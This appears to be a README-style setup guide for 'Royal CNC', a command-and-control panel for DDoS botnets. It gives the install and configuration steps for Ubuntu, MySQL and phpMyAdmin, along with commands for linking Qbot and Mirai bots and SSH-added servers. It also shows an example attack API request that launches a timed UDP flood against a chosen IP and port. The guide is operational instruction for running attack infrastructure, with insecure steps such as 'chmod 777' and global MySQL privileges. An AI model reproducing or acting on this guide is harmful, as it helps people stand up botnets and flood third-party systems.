Royal CNC Setup Guide 🚀
Welcome to this detailed guide for setting up Royal CNC. Follow these steps to install and configure Royal CNC on an Ubuntu 22.04 server.

🖥️ Recommended Operating System
Preferred OS: Ubuntu 22.04
Specifications: 1 GB RAM, 2 cores (can be lower)
📋 Prerequisites
Before starting, update your packages and install the necessary software:



sudo apt-get update && sudo apt-get upgrade
sudo apt-get install php apache2 phpmyadmin mysql-server mysql-client
🔗 Link PHPMYADMIN to the Apache2 Directory
Create a symbolic link for PHPMYADMIN:



sudo ln -s /usr/share/phpmyadmin/ /var/www/html
🔑 Create a Password
Visit Password Generator.
Uncheck "Include Symbols".
Set the password length to 32.
Note your generated password.
🛠️ Configure MySQL
Run the secure MySQL installation:



mysql_secure_installation
Set a password without using the password validation plugin.
Answer Y to all options.
Connect to MySQL:



mysql -u root -p
Once connected, run the following commands to configure the user:

sql

CREATE USER 'royal'@'localhost' IDENTIFIED BY '<password>';
GRANT ALL PRIVILEGES ON *.* TO 'royal'@'localhost';
FLUSH PRIVILEGES;
📝 Edit the config.json File
Change the IP and port for server and cnc_server as needed.
Set the MySQL username to royal and the password you created.
Edit the webhook, image, and website sections in the Discord part.
💾 Import the Database
Go to http://<your_api_ip>/phpmyadmin.
Log in with the username royal and the password you chose.
Create a database called royalcnc.
Click "Import" on the top bar, then "Browse".
Navigate to the royalcnc.sql file and import it.
🛠️ Configure config.json
Fill in the config.json file with your license key, VPS IP, and methods to execute.

🚀 Launch RoyalCNC
Navigate to the RoyalCNC directory:



cd /path/to/RoyalCNC
chmod 777 *
./RoyalCNC
🌐 Connect via Telnet
Connect via Telnet using Putty with the IP of your VPS and the port defined in config.json.

🔗 Link Dedicated Servers
To link dedicated servers or VPS, use the command:



api sshadd
🤖 Link Qbot or Mirai Bots
To link Qbot or Mirai bots, use the following commands:



api qbotadd
api miraiadd
📊 API Management
To manage APIs and more, access the API manager with the command api ? in the terminal.

Funnel of Royal CNC API
Royal CNC builds an API on top of your linked APIs and servers to interact with methods more easily. The API has two main endpoints:

🚀 api/attack
This endpoint allows you to send an attack. Here is an example request:

http

https://your-ip:8081/api/attack?username=royal&key=royal&host=77.77.77.77&port=80&time=60&method=UDP
Other endpoints include /api/view_plan, /api/ongoing, /api/running, /api/userlist, /api/viewlogs, and more!

🗄️ Database Access
To access your database, use PHPMYADMIN via http://<your_api_ip>/phpmyadmin.

With this guide, you should be able to configure and start your Royal CNC efficiently. Be sure to follow each step carefully and check the configurations to ensure your system runs smoothly. Happy configuring! 🚀